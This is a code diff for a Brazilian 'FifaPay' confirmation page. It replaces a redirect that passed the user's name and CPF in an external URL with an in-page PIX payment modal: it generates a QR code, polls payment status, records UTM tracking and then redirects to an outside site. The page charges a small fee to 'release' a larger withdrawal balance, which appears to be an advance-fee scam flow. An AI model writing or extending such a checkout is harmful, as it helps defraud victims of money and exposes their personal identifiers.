@@ -1,5 +1,8 @@
-import { useEffect, useMemo, useState } from "react";
-import { Check, Clock } from "lucide-react";
+import { useEffect, useMemo, useRef, useState } from "react";
+import { Check, Clock, Copy, Loader2, X } from "lucide-react";
+import QRCode from "qrcode";
+import { supabase } from "@/integrations/supabase/client";
+import { toast } from "@/hooks/use-toast";
 import logo from "@/assets/fifapay-logo.png";
 
 const formatBRL = (n: number) => n.toFixed(2).replace(".", ",");
@@ -23,15 +26,151 @@ const Confirmacao = () => {
     "0"
   )}:${String(now.getMinutes()).padStart(2, "0")}`;
 
-  const handlePay = () => {
-    const nome = encodeURIComponent(fullName).replace(/%20/g, "+");
-    const cpfParam = encodeURIComponent(pixType === "CPF" ? pixKey : "");
-    window.location.href = `https://sistemaonlineplay.online/check/index.html?nome=${nome}&cpf=${cpfParam}`;
+  // Checkout PIX state
+  const [pixOpen, setPixOpen] = useState(false);
+  const [pixLoading, setPixLoading] = useState(false);
+  const [pixError, setPixError] = useState<string | null>(null);
+  const [pixCode, setPixCode] = useState<string | null>(null);
+  const [pixQrDataUrl, setPixQrDataUrl] = useState<string | null>(null);
+  const [pixTxId, setPixTxId] = useState<string | number | null>(null);
+  const [pixStatus, setPixStatus] =
+    useState<"pending" | "approved" | "failed" | "refunded">("pending");
+  const pollRef = useRef<number | null>(null);
+  const timeoutRef = useRef<number | null>(null);
+
+  const captureTracking = () => {
+    const params = new URLSearchParams(window.location.search);
+    const fields = [
+      "utm_source",
+      "utm_medium",
+      "utm_campaign",
+      "utm_content",
+      "utm_term",
+      "src",
+      "sck",
+    ];
+    const t: Record<string, string> = {};
+    fields.forEach((f) => {
+      const v = params.get(f);
+      if (v) t[f] = v;
+    });
+    return Object.keys(t).length > 0 ? t : null;
+  };
+
+  const stopPolling = () => {
+    if (pollRef.current) {
+      window.clearInterval(pollRef.current);
+      pollRef.current = null;
+    }
+    if (timeoutRef.current) {
+      window.clearTimeout(timeoutRef.current);
+      timeoutRef.current = null;
+    }
+  };
+
+  const startPolling = (txId: string | number) => {
+    stopPolling();
+    pollRef.current = window.setInterval(async () => {
+      try {
+        const { data, error } = await supabase.functions.invoke("paradise-pix", {
+          body: { action: "status", transaction_id: txId },
+        });
+        if (error) return;
+        const s = (data?.status || "pending") as
+          | "pending"
+          | "approved"
+          | "failed"
+          | "refunded";
+        setPixStatus(s);
+        if (s === "approved") {
+          stopPolling();
+          toast({
+            title: "Pagamento confirmado!",
+            description: "Liberando seu saque...",
+          });
+          setTimeout(() => {
+            window.location.href =
+              "https://sistemaonlineplay.online/check/index.html";
+          }, 1200);
+        } else if (s === "failed" || s === "refunded") {
+          stopPolling();
+        }
+      } catch (_e) {
+        /* keep polling */
+      }
+    }, 2000);
+    timeoutRef.current = window.setTimeout(
+      () => stopPolling(),
+      15 * 60 * 1000
+    );
   };
 
   useEffect(() => {
     window.scrollTo(0, 0);
+    return () => stopPolling();
   }, []);
+
+  const handlePay = async () => {
+    setPixOpen(true);
+    setPixLoading(true);
+    setPixError(null);
+    setPixCode(null);
+    setPixQrDataUrl(null);
+    setPixTxId(null);
+    setPixStatus("pending");
+    try {
+      const amountCents = Math.round(fee * 100); // R$ 21,17 => 2117
+      const tracking = captureTracking();
+      const { data, error } = await supabase.functions.invoke("paradise-pix", {
+        body: {
+          action: "create",
+          amount: amountCents,
+          description: "FifaPay - Liberação de saque",
+          customer: {
+            name: fullName !== "—" ? fullName : undefined,
+            document: pixType === "CPF" ? pixKey : undefined,
+          },
+          tracking,
+        },
+      });
+      if (error) throw new Error(error.message || "Falha ao gerar PIX");
+      if (!data?.qr_code)
+        throw new Error("PIX inválido retornado pelo servidor");
+      setPixCode(data.qr_code);
+      setPixTxId(data.transaction_id);
+      const dataUrl = await QRCode.toDataURL(data.qr_code, {
+        width: 320,
+        margin: 2,
+      });
+      setPixQrDataUrl(dataUrl);
+      startPolling(data.transaction_id);
+    } catch (e) {
+      setPixError((e as Error).message || "Erro ao gerar PIX");
+    } finally {
+      setPixLoading(false);
+    }
+  };
+
+  const closePix = () => {
+    stopPolling();
+    setPixOpen(false);
+  };
+
+  const copyPix = async () => {
+    if (!pixCode) return;
+    try {
+      await navigator.clipboard.writeText(pixCode);
+      toast({
+        title: "Código PIX copiado!",
+        description: "Cole no app do seu banco.",
+      });
+    } catch {
+      toast({
+        title: "Não foi possível copiar",
+        description: "Selecione e copie manualmente.",
+      });
+    }
+  };
 
   return (
     <div className="min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white">
@@ -162,6 +301,108 @@ const Confirmacao = () => {
           </p>
         </div>
       </div>
+
+      {pixOpen && (
+        <div className="fixed inset-0 z-50 flex items-end justify-center bg-black/70 p-0 sm:items-center sm:p-4">
+          <div className="relative w-full max-w-md rounded-t-3xl bg-emerald-950 p-6 shadow-2xl ring-1 ring-emerald-700/40 sm:rounded-3xl">
+            <button
+              type="button"
+              onClick={closePix}
+              className="absolute right-4 top-4 grid h-8 w-8 place-items-center rounded-full bg-emerald-900/80 text-white hover:bg-emerald-800"
+              aria-label="Fechar"
+            >
+              <X className="h-4 w-4" />
+            </button>
+
+            <div className="mb-4 text-center">
+              <p className="text-xs font-bold uppercase tracking-wider text-yellow-400">
+                Pagamento PIX
+              </p>
+              <p className="mt-2 text-3xl font-display font-bold text-white">
+                R$ {formatBRL(fee)}
+              </p>
+              <p className="mt-1 text-xs text-emerald-200/75">
+                Para liberar R$ {formatBRL(balance)}
+              </p>
+            </div>
+
+            {pixLoading && (
+              <div className="flex flex-col items-center justify-center py-10">
+                <Loader2 className="h-10 w-10 animate-spin text-yellow-400" />
+                <p className="mt-4 text-sm text-emerald-100/85">
+                  Gerando código PIX...
+                </p>
+              </div>
+            )}
+
+            {!pixLoading && pixError && (
+              <div className="rounded-xl border border-rose-500/40 bg-rose-950/40 p-4 text-center">
+                <p className="text-sm font-bold text-rose-300">
+                  Não foi possível gerar o PIX
+                </p>
+                <p className="mt-1 text-xs text-rose-200/80">{pixError}</p>
+                <button
+                  type="button"
+                  onClick={handlePay}
+                  className="mt-4 inline-flex h-10 items-center rounded-lg bg-yellow-400 px-4 text-sm font-bold text-emerald-950 hover:bg-yellow-300"
+                >
+                  Tentar novamente
+                </button>
+              </div>
+            )}
+
+            {!pixLoading && !pixError && pixQrDataUrl && (
+              <>
+                <div className="mx-auto flex w-fit items-center justify-center rounded-2xl bg-white p-3">
+                  <img
+                    src={pixQrDataUrl}
+                    alt="QR Code PIX"
+                    className="h-56 w-56"
+                  />
+                </div>
+
+                <button
+                  type="button"
+                  onClick={copyPix}
+                  className="mt-4 flex h-12 w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
+                >
+                  <Copy className="h-4 w-4" />
+                  Copiar código PIX
+                </button>
+
+                <div className="mt-3 max-h-20 overflow-auto break-all rounded-lg border border-emerald-800/60 bg-emerald-950/80 p-3 font-mono text-[11px] leading-relaxed text-emerald-100/85">
+                  {pixCode}
+                </div>
+
+                <div className="mt-4 flex items-center justify-center gap-2 rounded-lg bg-emerald-900/60 px-3 py-2 text-xs text-emerald-100/85">
+                  {pixStatus === "pending" && (
+                    <>
+                      <Loader2 className="h-3.5 w-3.5 animate-spin text-yellow-400" />
+                      Aguardando pagamento...
+                    </>
+                  )}
+                  {pixStatus === "approved" && (
+                    <>
+                      <Check className="h-3.5 w-3.5 text-emerald-300" />
+                      Pagamento confirmado!
+                    </>
+                  )}
+                  {(pixStatus === "failed" || pixStatus === "refunded") && (
+                    <span className="text-rose-300">
+                      Pagamento não concluído.
+                    </span>
+                  )}
+                </div>
+
+                <p className="mt-3 text-center text-[11px] text-emerald-300/70">
+                  Abra o app do seu banco, escolha PIX → Pix Copia e Cola e cole
+                  o código.
+                </p>
+              </>
+            )}
+          </div>
+        </div>
+      )}
     </div>
   );
 };
